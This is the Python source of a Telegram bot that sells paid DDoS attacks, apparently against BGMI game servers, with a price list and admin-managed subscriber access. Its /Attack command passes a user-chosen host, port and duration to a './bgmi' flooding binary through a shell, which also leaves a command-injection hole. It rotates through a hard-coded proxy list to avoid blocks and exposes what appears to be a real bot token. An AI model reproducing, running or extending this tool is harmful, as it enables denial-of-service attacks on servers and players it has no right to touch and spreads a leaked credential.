import telebot
import time
from datetime import datetime
import subprocess
import os
import pymongo
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('8012854270:AAGmO0l9Fe0yd_yzdyoY-txsMGPhOY3fXtw')

# Admin user IDs
admin_id = ["7031907806","5716309534"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

#this id proxy by attackddosowner
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

#Function to read admin IDs from the file
def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["7031907806"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣:- @MR_ADARSH_YTs."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['Myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 𝐘𝐨𝐮𝐫 𝐢𝐧𝐟𝐨:\n\n🆔 𝐔𝐬𝐞𝐫 𝐈𝐝: <code>{user_id}</code>\n📝 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}\n🔖 𝐑𝐨𝐥𝐞: {user_role}\n📅 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐓𝐢𝐦𝐞: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣:- @MR_ADARSH_YTs."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @MR_ADARSH_YTs ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ADARSH_YTs 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ADARSH_YTs ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ADARSH_YTs❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = (
        f"🎇  𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐞𝐧𝐭 𝐬𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐞𝐲 !🎇\n\n"
        f"🎯 𝐓𝐚𝐫𝐠𝐞𝐭: `{target}`\n"
        f"🔌 𝐏𝐨𝐫𝐭: `{port}`\n"
        f"⏳ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: `{time} seconds`\n"
        f"🎮 𝐆𝐚𝐦𝐞: `𝐁𝐆𝐌𝐈`\n\n"
        f"📝 𝐀𝐝𝐯𝐢𝐜𝐞 :- 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} \n 𝐖𝐚𝐢𝐭 𝐇𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧 ...🚀\n"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/+pE_GZwn83y0xZjll")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
    

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['Attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 50"
                process = subprocess.run(full_command, shell=True)
                response = f"🎉 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝐓𝐚𝐫𝐠𝐞𝐭 -> {target} \n💢𝐏𝐨𝐫𝐭: {port} \n💢𝐓𝐢𝐦𝐞: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞🚀: /Attack  <𝐇𝐨𝐬𝐭> <𝐏𝐨𝐫𝐭> <𝐓𝐢𝐦𝐞>"  # Updated command syntax 
    else:
        response = '''🚫 𝐔𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐡𝐞𝐝 𝐀𝐜𝐜𝐞𝐬𝐬! 🚫

𝐎𝐨𝐩𝐬! 𝐈𝐭 𝐬𝐞𝐞𝐦𝐬 𝐥𝐢𝐤𝐞 𝐲𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐞 /𝐚𝐭𝐭𝐚𝐜𝐤 𝐜𝐨𝐦𝐦𝐚𝐧𝐝. 𝐓𝐨 𝐠𝐚𝐢𝐧 𝐚𝐜𝐜𝐞𝐬𝐬 𝐚𝐧𝐝 𝐮𝐧𝐥𝐞𝐚𝐬𝐡 𝐭𝐡𝐞 𝐩𝐨𝐰𝐞𝐫 𝐨𝐟 𝐚𝐭𝐭𝐚𝐜𝐤𝐬, 𝐲𝐨𝐮 𝐜𝐚𝐧:

👉 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐧 𝐀𝐝𝐦𝐢𝐧 𝐨𝐫 𝐭𝐡𝐞 𝐎𝐰𝐧𝐞𝐫-@MR_ADARSH_YTs 𝐟𝐨𝐫 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥.
🌟 𝐁𝐞𝐜𝐨𝐦𝐞 𝐚 𝐩𝐫𝐨𝐮𝐝 𝐬𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐫 𝐚𝐧𝐝 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥.
💬 𝐂𝐡𝐚𝐭 𝐰𝐢𝐭𝐡 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐧𝐨𝐰 𝐚𝐧𝐝 𝐥𝐞𝐯𝐞𝐥 𝐮𝐩 𝐲𝐨𝐮𝐫 𝐜𝐚𝐩𝐚𝐛𝐢𝐥𝐢𝐭𝐢𝐞𝐬!

🚀 𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐬𝐮𝐩𝐞𝐫𝐜𝐡𝐚𝐫𝐠𝐞 𝐲𝐨𝐮𝐫 𝐞𝐱𝐩𝐞𝐫𝐢𝐞𝐧𝐜𝐞? 𝐓𝐚𝐤𝐞 𝐚𝐜𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝐠𝐞𝐭 𝐫𝐞𝐚𝐝𝐲 𝐟𝐨𝐫 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬!'''

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🌍 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!* 🎉

🤖 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬:
💥 /Attack : 𝐌𝐞𝐭𝐡𝐨𝐝 𝐅𝐨𝐫 𝐁𝐠𝐦𝐢 𝐒𝐞𝐫𝐯𝐞𝐫𝐬. 
💥 /𝐫𝐮𝐥𝐞𝐬 : 𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐁𝐞𝐟𝐨𝐫𝐞 𝐔𝐬𝐞 !!.
💥 /𝐦𝐲𝐥𝐨𝐠𝐬 : 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐑𝐞𝐜𝐞𝐧𝐭𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐬.
💥 /𝐜𝐡𝐚𝐧𝐧𝐞𝐥 : 𝐜𝐡𝐞𝐜𝐤 𝐁𝐢𝐭 𝐍𝐞𝐭 𝐂𝐡𝐚𝐧𝐧𝐞𝐥
💥 /𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬𝐡𝐢𝐩 : 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫 𝐓𝐨 𝐓𝐡𝐞 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥
🤖 𝐓𝐨 𝐒𝐞𝐞 𝐁𝐨𝐭 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:
💥 /𝐚𝐝𝐦𝐢𝐧𝐜𝐦𝐝 : 𝐒𝐡𝐨𝐰𝐬 𝐀𝐥𝐥 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬.
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("/Attack 🚀")
    btn2 = KeyboardButton("/Myinfo ℹ️")
    btn3 = KeyboardButton("/Rules 🧾")
    btn4 = KeyboardButton("/Plan 🤑")
    btn5 = KeyboardButton("/Canary 🦅")
    btn6 = KeyboardButton("/Channel 💯")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐨𝐭: \n 𝐂𝐡𝐨𝐨𝐬𝐞 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 :*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(commands=['Channel'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f''' 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐅𝐨𝐫 𝐍𝐞𝐰 𝐅𝐫𝐞𝐞 𝐃𝐝𝐨𝐬  𝐔𝐩𝐝𝐚𝐭𝐞𝐬 & 𝐏𝐚𝐢𝐝 𝐝𝐝𝐨𝐬:
𝐎𝐖𝐍𝐄𝐑: @MR_ADARSH_YTs
'''

    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('CHANNEL', url='https://t.me/+pE_GZwn83y0xZjll'),
        telebot.types.InlineKeyboardButton('GROUP', url='https://t.me/+pE_GZwn83y0xZjll')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)


@bot.message_handler(commands=['Canary'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''💥 𝐏𝐥𝐞𝐚𝐬𝐞 𝐓𝐚𝐩 𝐭𝐡𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐟𝐨𝐫 𝐂𝐚𝐧𝐚𝐫𝐲 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝:
'''
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("CANARY 🦅", url="https://t.me/+pE_GZwn83y0xZjll")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)

    
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''🤩 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 @MR_ADARSH_YTs 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓 , 
🌜 /𝐚𝐝𝐝 : 𝐚𝐝𝐝 {𝐮𝐬𝐞𝐫_𝐢𝐝}  {𝐭𝐢𝐦𝐞} 
❣️ /𝐫𝐞𝐦𝐨𝐯𝐞: 𝐫𝐞𝐦𝐨𝐯𝐞 {𝐮𝐬𝐞𝐫_𝐢𝐝}
🌠 /𝐚𝐥𝐥𝐮𝐬𝐞𝐫𝐬 : 𝐜𝐡𝐞𝐜𝐤 𝐚𝐥𝐥 𝐮𝐬𝐞𝐫𝐬
🤩 /𝐜𝐥𝐞𝐚𝐫𝐥𝐨𝐠𝐬 : 𝐜𝐡𝐞𝐜𝐤 𝐚𝐥𝐥 𝐥𝐨𝐠𝐬
'''
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['Rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐏𝐥𝐞𝐚𝐬𝐞 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬 ⚠️:

𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.
𝟑. 𝐌𝐀𝐊𝐄 𝐒𝐔𝐑𝐄 𝐘𝐎𝐔 𝐉𝐎𝐈??𝐄𝐃 https://t.me/+pE_GZwn83y0xZjll 𝐎𝐓𝐇𝐄𝐑𝐖𝐈𝐒𝐄 𝐍𝐎𝐓 𝐖𝐎𝐑𝐊
𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['Plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐁𝐫𝐨𝐭𝐡𝐞𝐫 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐝𝐨𝐬 !!:

𝐕𝐢𝐩 🌟 :
-> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟑𝟎𝟎 (𝐒)
> 𝐀𝐟𝐭𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐢𝐦𝐢𝐭 : 𝟏𝟎 𝐬𝐞𝐜
-> 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧??𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 : 𝟓

𝐏𝐫-𝐢𝐜𝐞 𝐋𝐢𝐬𝐭💸 :
𝐃𝐚𝐲-->𝟖𝟎 𝐑𝐬
𝐖𝐞𝐞𝐤-->𝟒𝟎𝟎 𝐑𝐬
𝐌𝐨𝐧𝐭𝐡-->𝟏𝟎𝟎𝟎 𝐑𝐬
DM @MR_ADARSH_YTs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


